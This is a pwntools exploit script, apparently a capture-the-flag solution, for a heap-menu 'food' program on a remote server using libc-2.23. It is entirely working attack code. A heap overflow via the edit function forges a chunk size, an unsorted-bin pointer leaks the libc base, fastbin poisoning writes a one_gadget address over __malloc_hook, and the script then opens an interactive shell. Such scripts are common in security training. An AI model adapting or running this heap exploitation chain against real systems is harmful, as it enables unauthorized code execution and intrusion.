from pwn import *
context(log_level='debug',os='linux',arch='amd64')

#p = process('./1')
p =remote("59.110.164.72",10031)
elf=ELF('./1')
libc=ELF('./libc-2.23.so')
one = [0x45226,0x4527a,0xf03a4,0xf1247]

p.sendlineafter(b"Your choice:",str(4))

def menu(choice):
    p.sendlineafter(b"Your choice:",str(choice))


def add(size,com):
    menu(2)
    p.sendlineafter(b"price of food:",str(size))
    p.sendlineafter(b"Please enter the name of food:",com)

def edit(idx,size,com):
    menu(3)
    p.sendlineafter(b"Please enter the index of food:",str(idx))
    p.sendlineafter(b"Please enter the price of food :",str(size))
    p.sendlineafter(b"Please enter the name of food:",com)

def free(idx):
    menu(4)
    p.sendlineafter(b"Please enter the index of food:",str(idx))

def show():
    menu(1)
    # p.sendlineafter("")

add(0x68,'a')
add(0x68,'b')
add(0x68,'c')
add(0x68,'d')
add(0x68,'e')

edit(0,0x80,b'c'*0x60+p64(0)+p64(0xe1))
free(1)
add(0x68,'')
show()
p.recvuntil(b"2 : ")
libc_addr = u64(p.recvuntil(b"\x7f").ljust(8,b"\x00"))-0x3c4b78
print ("libc_base -->",hex(libc_addr))
malloc_hook = libc_addr+libc.symbols['__malloc_hook']-0x23
print ("malloc_hook -->",hex(malloc_hook))
gadget = libc_addr+one[1]
add(0x68,'f')


# free(0)
free(3)
free(2)
free(1)
edit(0,0x80,p64(0)*0xd+p64(0x70)+p64(malloc_hook))
add(0x68,'g')
add(0x68,b'a'*19+p64(gadget))
# gdb.attach(p,"b *0x400ddf")
# pause()
# add(0x30,'test')
# gdb.attach(p)
p.sendlineafter(b"Your choice:",str(2))
p.sendlineafter(b"price of food:",str(1))
p.interactive()